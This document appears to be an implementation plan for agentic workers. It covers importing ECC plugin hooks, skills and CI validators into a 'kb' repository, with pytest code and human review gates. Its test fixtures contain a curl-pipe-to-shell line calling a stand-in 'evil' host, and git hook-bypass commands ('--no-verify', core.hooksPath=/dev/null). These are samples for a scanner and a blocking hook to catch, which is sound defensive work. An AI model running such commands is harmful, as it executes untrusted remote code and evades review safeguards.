# ECC Import Wave 1 Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Import the approved ECC Tier-1 first-wave items as kb-native artifacts via real queue cards with Inspector grading, producing the first real rows in `ledgers/grades/`.

**Architecture:** Work products land in worktree `C:/Users/danie/kb-worktrees/ecc-import` (branch `claude/ecc-import-w1`, from origin/main e948ec4). Coordination (cards, grade/activity ledgers) lands on the `ops` branch via worktree `C:/Users/danie/kb-worktrees/dashboard-ops` with pull-rebase-before-write / push-after discipline. Hooks are copied near-verbatim from ECC (JS, run under node) and retargeted; skills are markdown copies with kb provenance frontmatter; tests are pytest driving the JS via subprocess (kb's single test runner).

**Tech Stack:** Python 3 + pytest (kb convention), Node (present — dashboard uses it), markdown skills, Claude Code repo-scoped `.claude/settings.json`.

## Global Constraints

- ECC quarry (read-only source): `C:\Users\danie\.claude\plugins\cache\ecc\ecc\2.0.0` — NEVER modified.
- ECC disable mechanism (verified in `scripts/lib/hook-flags.js`): env `ECC_DISABLED_HOOKS` = comma-separated hook ids; `ECC_HOOK_PROFILE` = minimal|standard|strict (default standard). Hook ids live in ECC `hooks/hooks.json` under `"id"` keys.
- `governance/` and `CLAUDE.md` are human-edited only — propose changes to Daniel, never edit.
- Every imported artifact gets provenance frontmatter/header: `source: ecc@2.0.0/<relative path>`, `imported: 2026-07-19`, `provenance-tier: imported`.
- Enforcement modes (Daniel-approved): `block-no-verify` = block (exit 2) from day one; `delivery-gate` = warn-only (exit 0 with stderr message); flip-to-block is a wave-2 card.
- Workers do not commit; the orchestrator reviews diffs, runs tests, commits. Workers are Opus 4.8 or below, model self-reported.
- Ops writes: `git -C C:/Users/danie/kb-worktrees/dashboard-ops pull --rebase origin ops` immediately before every write, push immediately after; rejected push = re-read state, reconcile, retry.
- Cards: `project: kb-ops`, `risk-tier: T2`, `role: work`, `runtime: claude`, model stamped `opus` via card-level routing override (card > yaml precedence in `scripts/routing.py`).
- Card lifecycle per card N: file (inbox) → orchestrator assigns owner `worker-desktop` + moves to working → work happens on `claude/ecc-import-w1` → orchestrator appends `## Result` + moves to done → inspector grades.
- Grading: invoke the curated `inspector` skill fresh-context per completed card; it writes the grade row (schema `{worker,project,task_type,tier,card_id,score,pass,rubric_version,inspector_id,ts}`) via `scripts/grade.py` under `inspector@agents.local` plus the paired activity row. Never hand-write grade rows.
- pytest runs from the worktree root: `python -m pytest tests/<file> -v`. Full suite must stay green at wave end.

---

### Task 1: File all wave-1 + wave-2 cards on ops

**Files:**
- Create (on ops branch, via `C:/Users/danie/kb-worktrees/dashboard-ops`): `queue/inbox/<id>.md` × 10

**Interfaces:**
- Consumes: `scripts/cards.py` — `new_card(project, action, target, risk_tier, body, **extra)`, `save(card, queue_root)`; extra fields pass into frontmatter (`role`, `runtime`, `model`, `depends-on`, `workflow`).
- Produces: 10 card files; record each card's id → W-number mapping in this plan's execution notes (later tasks reference cards by W-number).

- [ ] **Step 1: Rebase ops worktree**

Run: `git -C C:/Users/danie/kb-worktrees/dashboard-ops pull --rebase origin ops`
Expected: `Successfully rebased` or `Already up to date`.

- [ ] **Step 2: File the 10 cards with a Python script**

Run from `C:/Users/danie/kb` (library import path), writing to the ops worktree queue. Wave-1 bodies carry a `## Work order` naming the design doc + the exact deliverable; wave-2 cards get `depends-on` = [all five wave-1 ids] plus a body line "BLOCKED until Daniel's wave-1 checkpoint".

```python
# file_cards.py (run once from scratchpad, do not commit)
import sys; sys.path.insert(0, r"C:/Users/danie/kb/scripts")
import cards
from pathlib import Path
QR = Path(r"C:/Users/danie/kb-worktrees/dashboard-ops/queue")
DESIGN = "docs/plans/2026-07-19-ecc-import-wave1-design.md (branch claude/ecc-import-w1)"
wave1 = [
  ("scope ECC hooks off for kb + bootstrap kb hook layer", ".claude/settings.json",
   "W1.0: create repo-scoped .claude/settings.json disabling all ECC hook ids via ECC_DISABLED_HOOKS; empty kb hooks block for later cards. Verify GateGuard no longer fires."),
  ("import loop-design-check skill retargeted to kb", "skills/imported/loop-design-check/",
   "W1.1: copy ECC skills/loop-design-check/SKILL.md; retarget exit conditions to kb cards + ledgers/grades; add provenance frontmatter; must pass scripts/scan_skill.py."),
  ("import delivery-gate hook (warn) + growth-log standard", "scripts/hooks/ + skills/imported/growth-log/",
   "W1.2: retarget delivery-gate Stop hook to memory/<agent-id>.md, WARN-ONLY (exit 0); growth-log SKILL.md alongside; wire Stop hook into .claude/settings.json; pytest via subprocess."),
  ("import block-no-verify hook (block)", "scripts/hooks/block_no_verify.js",
   "W1.3: copy ECC scripts/hooks/block-no-verify.js near-verbatim; block mode (exit 2); wire PreToolUse:Bash in .claude/settings.json; pytest via subprocess."),
  ("import CI validators + provenance schema", "scripts/ci/ + scripts/schemas/provenance.schema.json",
   "W1.4: retarget check-unicode-safety, scan-supply-chain-iocs, validate-skills to kb skills/ tree; align provenance.schema.json to kb tiers; pytest smoke per validator."),
]
wave2 = [
  ("retarget GateGuard destructive-command classifier to kb", "scripts/hooks/", "W2.1 — copy classifier, don't re-derive."),
  ("import config-protection hook for governance/+CLAUDE.md", "scripts/hooks/", "W2.2"),
  ("import strategic-compact skill", "skills/imported/strategic-compact/", "W2.3"),
  ("adopt save-session handoff template for memory/ resume notes", "skills/imported/", "W2.4"),
  ("flip delivery-gate warn->block after clean soak", ".claude/settings.json + scripts/hooks/", "W2.5"),
]
ids = []
for action, target, body in wave1:
    c = cards.new_card("kb-ops", action, target, "T2",
        body=f"## Work order\nPer {DESIGN}. {body}\n", role="work", runtime="claude",
        model="opus", workflow="ecc-import-w1")
    ids.append(c.meta["id"]); cards.save(c, QR)
for action, target, body in wave2:
    c = cards.new_card("kb-ops", action, target, "T2",
        body=f"## Work order\nPer {DESIGN}. {body}\nBLOCKED until Daniel's wave-1 checkpoint.\n",
        role="work", runtime="claude", model="opus", workflow="ecc-import-w2",
        **{"depends-on": ids[:]})
    cards.save(c, QR)
print("wave1 ids:", ids)
```

Note: inspect `cards.new_card` before running — if extra-field spelling differs (underscore vs hyphen), match `governance/card-schema.md` exactly (`depends-on`).

- [ ] **Step 3: Verify cards parse**

Run: `python -c "import sys;sys.path.insert(0,r'C:/Users/danie/kb/scripts');import cards;from pathlib import Path;[cards.parse(p) for p in Path(r'C:/Users/danie/kb-worktrees/dashboard-ops/queue/inbox').glob('*.md')];print('ALL PARSE OK')"`
Expected: `ALL PARSE OK`

- [ ] **Step 4: Commit + push ops**

```bash
git -C C:/Users/danie/kb-worktrees/dashboard-ops add queue/inbox
git -C C:/Users/danie/kb-worktrees/dashboard-ops commit -m "cards: file ECC import wave-1 (5) + wave-2 (5, blocked) [ecc-import-w1]"
git -C C:/Users/danie/kb-worktrees/dashboard-ops push origin ops
```
Expected: push accepted (retry with rebase on rejection).

---

### Task 2: W1.0 — ECC scope-off + kb hook-layer bootstrap

**Files:**
- Create: `C:/Users/danie/kb-worktrees/ecc-import/.claude/settings.json`
- Test: `C:/Users/danie/kb-worktrees/ecc-import/tests/test_kb_hook_settings.py`

**Interfaces:**
- Produces: `.claude/settings.json` with `env.ECC_DISABLED_HOOKS` (all ECC ids) + `hooks: {}`; Tasks 4/5 add entries under `hooks`.

- [ ] **Step 1: Enumerate ECC hook ids**

Run: `node -e "const h=require('C:/Users/danie/.claude/plugins/cache/ecc/ecc/2.0.0/hooks/hooks.json');const ids=[];for(const evt of Object.values(h.hooks||{}))for(const m of evt)if(m.id)ids.push(m.id);console.log(ids.join(','))"`
Expected: comma-separated id list including `pre:bash:dispatcher`. If some matchers lack `id`, note them — the consolidated dispatchers gate their sub-hooks through the same flags lib, so disabling the dispatcher id suffices; verify by reading the dispatcher script's flag checks.

- [ ] **Step 2: Write failing test**

```python
# tests/test_kb_hook_settings.py
import json, os, subprocess
from pathlib import Path
import pytest

REPO = Path(__file__).resolve().parents[1]
SETTINGS = REPO / ".claude" / "settings.json"
ECC = Path(r"C:/Users/danie/.claude/plugins/cache/ecc/ecc/2.0.0")

def test_settings_exists_and_parses():
    data = json.loads(SETTINGS.read_text(encoding="utf-8"))
    assert "env" in data and "hooks" in data

@pytest.mark.skipif(not ECC.exists(), reason="ECC plugin not installed")
def test_all_ecc_hook_ids_disabled():
    data = json.loads(SETTINGS.read_text(encoding="utf-8"))
    disabled = set(data["env"]["ECC_DISABLED_HOOKS"].split(","))
    ecc_hooks = json.loads((ECC / "hooks" / "hooks.json").read_text(encoding="utf-8"))
    ids = {m["id"] for evt in ecc_hooks.get("hooks", {}).values() for m in evt if "id" in m}
    assert ids <= disabled, f"missing: {ids - disabled}"

@pytest.mark.skipif(not ECC.exists(), reason="ECC plugin not installed")
def test_disabled_hook_is_skipped_by_ecc_lib():
    r = subprocess.run(
        ["node", "-e",
         "const f=require(process.argv[1]);process.exit(f.isHookEnabled('pre:bash:dispatcher',{})?1:0)",
         str(ECC / "scripts" / "lib" / "hook-flags.js")],
        env={**os.environ, "ECC_DISABLED_HOOKS": "pre:bash:dispatcher"},
        capture_output=True)
    assert r.returncode == 0, r.stderr.decode()
```

- [ ] **Step 3: Run tests, verify failure** — `python -m pytest tests/test_kb_hook_settings.py -v` → first two FAIL (no settings file), third PASS (tests ECC lib directly).

- [ ] **Step 4: Create `.claude/settings.json`**

```json
{
  "$schema": "https://json.schemastore.org/claude-code-settings.json",
  "env": {
    "ECC_DISABLED_HOOKS": "<Step-1 output verbatim>",
    "ECC_GATEGUARD": "off"
  },
  "hooks": {}
}
```

- [ ] **Step 5: Run tests, verify pass** — all 3 PASS.
- [ ] **Step 6: Commit** — `git add .claude tests && git commit -m "feat(hooks): W1.0 scope ECC hooks off for kb; bootstrap kb hook layer"`
- [ ] **Step 7: Card lifecycle + grade** — append `## Result` (what landed, commit sha, "changed-locally / verified-locally" wording), move card to done on ops (rebase/push), invoke `inspector` skill on the card fresh-context; confirm one grade row + one activity row appeared in `ledgers/grades/` / `ledgers/activity/` on ops.

---

### Task 3: W1.1 — loop-design-check skill import

**Files:**
- Create: `skills/imported/loop-design-check/SKILL.md`
- Test: none new (gate = `scripts/scan_skill.py` clean)

**Interfaces:**
- Consumes: ECC `skills/loop-design-check/SKILL.md` (143 lines).
- Produces: kb-retargeted skill; promotion to `curated/` is Daniel's later gate, NOT this task.

- [ ] **Step 1: Copy + retarget.** Frontmatter gains `source: ecc@2.0.0/skills/loop-design-check/SKILL.md`, `imported: 2026-07-19`, `provenance-tier: imported`. Retarget every ECC-specific reference: exit conditions phrased against kb cards (`queue/`, card `## Result`), grades (`ledgers/grades/`), STOP file, §8.1 loop tiers; "self-improving loops need STRICTER review" keyed to kb's injection gate. Keep the judgment content (machine-decidable goals, reconciliation-over-assertion, anti-Goodhart boundaries, judgment-stays-human) intact.
- [ ] **Step 2: Scan.** Run `python C:/Users/danie/kb/scripts/scan_skill.py skills/imported/loop-design-check/SKILL.md` → exit 0 / no findings.
- [ ] **Step 3: Commit** — `git add skills/imported/loop-design-check && git commit -m "feat(skills): W1.1 import loop-design-check (ecc@2.0.0, retargeted)"`
- [ ] **Step 4: Card lifecycle + grade** (same as Task 2 Step 7).
- [ ] **Step 5: HUMAN GATE — present the skill to Daniel for §6 read-through** (promotion imported→curated is his call; record his answer in the card Result before closing).

---

### Task 4: W1.2 — delivery-gate hook (warn) + growth-log

**Files:**
- Create: `scripts/hooks/delivery_gate.js` (retargeted copy of ECC `skills/delivery-gate/hooks/` Stop hook), `skills/imported/growth-log/SKILL.md`
- Modify: `.claude/settings.json` (add Stop hook entry)
- Test: `tests/test_delivery_gate_hook.py`

**Interfaces:**
- Consumes: `.claude/settings.json` from Task 2 (`hooks` object).
- Produces: Stop hook wired as `{"hooks": {"Stop": [{"hooks": [{"type": "command", "command": "node scripts/hooks/delivery_gate.js"}]}]}}`; warn-only contract: ALWAYS exit 0; prints `[delivery-gate WARN] ...` to stderr when `memory/<agent-id>.md` untouched this session.

- [ ] **Step 1: Read the ECC source** (`skills/delivery-gate/hooks/`) and note its machine-verifiable checks (memory-file mtime, disk space) vs heuristic checks. Port ONLY the memory-append check; drop disk-space (ECC-specific) and anything reading ECC state dirs.
- [ ] **Step 2: Write failing test**

```python
# tests/test_delivery_gate_hook.py
import os, subprocess, time
from pathlib import Path
REPO = Path(__file__).resolve().parents[1]
HOOK = REPO / "scripts" / "hooks" / "delivery_gate.js"

def run_hook(tmp, extra_env=None):
    env = {**os.environ, "KB_ROOT": str(tmp), **(extra_env or {})}
    return subprocess.run(["node", str(HOOK)], input=b"{}", capture_output=True, env=env)

def test_warns_when_memory_untouched(tmp_path):
    (tmp_path / "memory").mkdir()
    old = tmp_path / "memory" / "test-agent.md"; old.write_text("x")
    os.utime(old, (time.time() - 7200, time.time() - 7200))
    r = run_hook(tmp_path, {"KB_AGENT_ID": "test-agent", "KB_SESSION_START": str(int(time.time()) - 3600)})
    assert r.returncode == 0                      # warn-only: NEVER blocks
    assert b"delivery-gate WARN" in r.stderr

def test_silent_when_memory_appended(tmp_path):
    (tmp_path / "memory").mkdir()
    (tmp_path / "memory" / "test-agent.md").write_text("fresh")
    r = run_hook(tmp_path, {"KB_AGENT_ID": "test-agent", "KB_SESSION_START": str(int(time.time()) - 3600)})
    assert r.returncode == 0 and b"WARN" not in r.stderr

def test_silent_when_agent_unknown(tmp_path):
    r = run_hook(tmp_path)                        # no KB_AGENT_ID -> fail open, silent
    assert r.returncode == 0 and b"WARN" not in r.stderr
```

- [ ] **Step 3: Run, verify FAIL** (hook missing).
- [ ] **Step 4: Implement `scripts/hooks/delivery_gate.js`** — provenance header comment; reads `KB_ROOT` (default: repo root resolved from script location), `KB_AGENT_ID`, `KB_SESSION_START` (epoch secs); if agent id absent or memory file mtime ≥ session start → exit 0 silent; else stderr warn, exit 0. No other behavior.
- [ ] **Step 5: Run, verify PASS.**
- [ ] **Step 6: growth-log skill** — copy `skills/growth-log/SKILL.md` → `skills/imported/growth-log/SKILL.md`, retarget file references to `memory/<agent-id>.md`, keep the content standard ("Next time I see [signal], I will [action]" mandatory; failures > achievements; dedupe before writing). Provenance frontmatter. `scan_skill.py` clean.
- [ ] **Step 7: Wire Stop hook into `.claude/settings.json`** (exact JSON above); rerun `python -m pytest tests/test_kb_hook_settings.py tests/test_delivery_gate_hook.py -v` → all PASS.
- [ ] **Step 8: Commit** — `feat(hooks): W1.2 delivery-gate warn-mode + growth-log standard (ecc@2.0.0)`
- [ ] **Step 9: Card lifecycle + grade; HUMAN GATE for growth-log read-through** (as Task 3 Step 5).

---

### Task 5: W1.3 — block-no-verify hook (block)

**Files:**
- Create: `scripts/hooks/block_no_verify.js` (near-verbatim copy of ECC `scripts/hooks/block-no-verify.js`, 546 lines)
- Modify: `.claude/settings.json` (PreToolUse Bash entry)
- Test: `tests/test_block_no_verify_hook.py`

**Interfaces:**
- Consumes: `.claude/settings.json` `hooks` object.
- Produces: PreToolUse entry `{"matcher": "Bash", "hooks": [{"type": "command", "command": "node scripts/hooks/block_no_verify.js"}]}`; contract: reads hook JSON on stdin (`{"tool_input": {"command": "..."}}`), exit 2 + stderr reason on `--no-verify` / `-c core.hooksPath=` bypass patterns, exit 0 otherwise.

- [ ] **Step 1: Write failing test**

```python
# tests/test_block_no_verify_hook.py
import json, subprocess
from pathlib import Path
HOOK = Path(__file__).resolve().parents[1] / "scripts" / "hooks" / "block_no_verify.js"

def run_hook(cmd):
    payload = json.dumps({"tool_name": "Bash", "tool_input": {"command": cmd}}).encode()
    return subprocess.run(["node", str(HOOK)], input=payload, capture_output=True)

def test_blocks_no_verify():
    assert run_hook("git commit --no-verify -m x").returncode == 2

def test_blocks_hookspath_override():
    assert run_hook("git -c core.hooksPath=/dev/null commit -m x").returncode == 2

def test_allows_normal_commit():
    assert run_hook("git commit -m x").returncode == 0

def test_allows_mention_in_string():
    assert run_hook("echo 'docs about --no-verify'").returncode == 0
```

- [ ] **Step 2: Run, verify FAIL.**
- [ ] **Step 3: Copy ECC source near-verbatim** — provenance header; strip only ECC-specific plumbing (flags-lib gating, ECC state paths); do NOT re-derive the quote-aware pattern logic. If the string-literal-mention test fails against the verbatim copy, match ECC's actual behavior and adjust the test to it — the classifier's judgment is the import, our guess isn't.
- [ ] **Step 4: Run, verify PASS.**
- [ ] **Step 5: Wire into settings.json; rerun the settings + hook tests.**
- [ ] **Step 6: Commit** — `feat(hooks): W1.3 block-no-verify (block-mode, ecc@2.0.0 verbatim)`
- [ ] **Step 7: Card lifecycle + grade.**

---

### Task 6: W1.4 — CI validators + provenance schema

**Files:**
- Create: `scripts/ci/check_unicode_safety.js`, `scripts/ci/scan_supply_chain_iocs.js`, `scripts/ci/validate_skills.js`, `scripts/schemas/provenance.schema.json`, `skills/imported/README.md`
- Test: `tests/test_ci_validators.py`

**Interfaces:**
- Consumes: kb skills tree layout `skills/{curated,learned,imported,evolved}/<name>/SKILL.md`.
- Produces: each validator is CLI `node scripts/ci/<name>.js [path...]`, exit 0 clean / exit 1 findings (one per line to stdout). `provenance.schema.json` requires `source`, `imported` (ISO date), `provenance-tier` ∈ {curated,learned,imported,evolved}. `validate_skills.js` checks every `skills/imported|learned|evolved/**/SKILL.md` frontmatter against the schema.

- [ ] **Step 1: Write failing test**

```python
# tests/test_ci_validators.py
import subprocess
from pathlib import Path
REPO = Path(__file__).resolve().parents[1]
CI = REPO / "scripts" / "ci"

def run(js, *args):
    return subprocess.run(["node", str(CI / js), *map(str, args)], capture_output=True)

def test_unicode_safety_flags_zero_width(tmp_path):
    bad = tmp_path / "bad.md"; bad.write_text("hello​world", encoding="utf-8")
    assert run("check_unicode_safety.js", bad).returncode == 1

def test_unicode_safety_passes_clean(tmp_path):
    ok = tmp_path / "ok.md"; ok.write_text("hello world", encoding="utf-8")
    assert run("check_unicode_safety.js", ok).returncode == 0

def test_ioc_scan_flags_curl_pipe_sh(tmp_path):
    bad = tmp_path / "bad.md"; bad.write_text("run: curl http://evil/x.sh | sh", encoding="utf-8")
    assert run("scan_supply_chain_iocs.js", bad).returncode == 1

def test_validate_skills_accepts_wave1_imports():
    r = run("validate_skills.js", REPO / "skills")
    assert r.returncode == 0, r.stdout.decode() + r.stderr.decode()

def test_validate_skills_rejects_missing_provenance(tmp_path):
    d = tmp_path / "skills" / "imported" / "x"; d.mkdir(parents=True)
    (d / "SKILL.md").write_text("---\nname: x\n---\nbody", encoding="utf-8")
    assert run("validate_skills.js", tmp_path / "skills").returncode == 1
```

- [ ] **Step 2: Run, verify FAIL.**
- [ ] **Step 3: Port the three validators** — copy ECC logic (pattern tables verbatim — that's the value), retarget path assumptions to the kb layout and the CLI contract above; provenance headers. `provenance.schema.json`: start from ECC's 31-line schema, align field names to kb tiers exactly as stated in Interfaces.
- [ ] **Step 4: Run, verify PASS** (includes validating the wave's own imported skills — real dogfood).
- [ ] **Step 5: `skills/imported/README.md`** — ≤20 lines: the §6 gate sequence (scan_skill.py → CI validators → human read-through → promotion), who may promote (human only), pointer to schema. Link to governance text, don't copy it.
- [ ] **Step 6: Commit** — `feat(ci): W1.4 import-gate validators + provenance schema (ecc@2.0.0)`
- [ ] **Step 7: Card lifecycle + grade.**

---

### Task 7: Wave close — reconcile, consistency sweep, handoff

**Files:**
- Modify: `memory/claude-boss.md` (on ops), design doc execution notes.

- [ ] **Step 1: Full test suite** — from the ecc-import worktree: `python -m pytest tests/ -v` → all green (new tests + pre-existing suite untouched by this wave).
- [ ] **Step 2: Reconcile with real data** — `python C:/Users/danie/kb/scripts/reconcile.py` (desktop tier) against ops: expect ZERO quarantines and no `FROZEN` sentinel; every wave grade row matches an inspector activity row. If anything quarantines, STOP and diagnose — never clear FROZEN (human-only).
- [ ] **Step 3: Consistency sweep** — grep the branch for: duplicated growth-log wording vs `governance/agent-rules.md` (link, don't restate); validator overlap with `scan_skill.py` (README documents the layering: scan_skill = quick heuristic, CI validators = deep gate); dead ECC references (paths under `plugins/cache` must appear ONLY in provenance headers and skipif-marked tests); files > ~300 lines that could shrink. Fix inline, commit `chore: wave-1 consistency sweep`.
- [ ] **Step 4: Memory append** (constitution) — lessons to `memory/claude-boss.md` on ops (rebase/push).
- [ ] **Step 5: HUMAN GATE — wave-1 review + wave-2 go/no-go** — present Daniel the branch summary (commits, card ids, grade rows), open promotion decisions, and ask go/no-go on wave 2. Branch stays local — merging is his.
